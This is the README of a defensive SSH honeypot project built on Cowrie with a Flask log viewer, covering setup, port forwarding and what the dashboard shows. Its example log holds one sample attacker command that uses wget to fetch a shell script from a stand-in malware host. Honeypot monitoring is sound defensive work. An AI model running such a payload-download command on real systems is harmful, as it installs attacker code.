# DEFpot  
“Step in the pot. Join the flock.”

## 🐍 Overview

**DEFpot** is a lightweight SSH honeypot system based on [Cowrie](https://github.com/cowrie/cowrie), designed to monitor and log unauthorized login attempts in real-time via a clean Flask-based web UI.

Attackers are lured into an isolated fake SSH environment where every move they make — from connection, login, to command execution — is logged and streamed live in a browser.

## 🔥 Features

- ✅ Real-time traffic display via Flask + SSE
- ✅ Auto-scrolling log viewer with dark mode
- ✅ Visual feedback on:
  - Port scanning behavior
  - SSH logins (usernames)
  - Commands executed
- ✅ Fully sandboxed via `python3-venv`
- ✅ Systemd service for persistent honeypot runtime

---

## 🧱 Folder Structure

```
DEFpot/
├── cowrie/                # Pre-configured Cowrie honeypot
├── cowrie_web_monitor/    # Flask-based UI
│   ├── app.py             # Main web app
│   ├── templates/
│   │   └── index.html
│   └── static/
│       └── styles.css
├── install.sh             # Auto-setup script
└── README.md              # This file
```

---

## ⚙️ Installation

1. Clone the repository:

```bash
git clone https://github.com/Dark-Avenger-Reborn/DEFpot.git
cd DEFpot
```

2. Run the setup script:

```bash
chmod +x install.sh
./install.sh
```

This will:
- Install system dependencies
- Set up a virtual environment inside `cowrie/`
- Install Cowrie's requirements
- Create a systemd service for Cowrie
- Start Cowrie as a background service

3. Configure your firewall/router to **forward port `22` (SSH)** to **port `2223`** on the host machine.  
   This is required because Cowrie listens on `2223` (by default) instead of directly on `22`.

> 🔒 This prevents Cowrie from needing root to bind to port 22, while still catching incoming SSH traffic.

---

## 🚀 Running the Web UI

In a second terminal:

```bash
cd cowrie_web_monitor
python3 app.py
```

Then visit:

```
http://localhost:8080
```

You'll see live attack logs stream in as they happen.

---

## 🕵️‍♀️ What You’ll See

Example logs:

```
192.168.0.5 is scanning ports  
192.168.0.5 logged in as root via SSH  
192.168.0.5 ran: wget http://malware.site/shell.sh
```

---

## 🔁 Required for Full Operation

✅ Cowrie must be running as a `systemd` service  
✅ `app.py` must be running to serve the web UI  
✅ Port 22 must be redirected to Cowrie’s listening port (default: 2223)

---

## 💬 Tips

- Want to run `app.py` as a service? Consider `systemd` or `supervisor`.
- Use `ufw` or `iptables` to control and log forwarded traffic.
- Tail the raw log manually:  
  `tail -f cowrie/var/log/cowrie/cowrie.log`

---

## 📜 License

MIT — see [LICENSE](LICENSE)

---

**DEFpot**  
“Step in the pot. Join the flock.”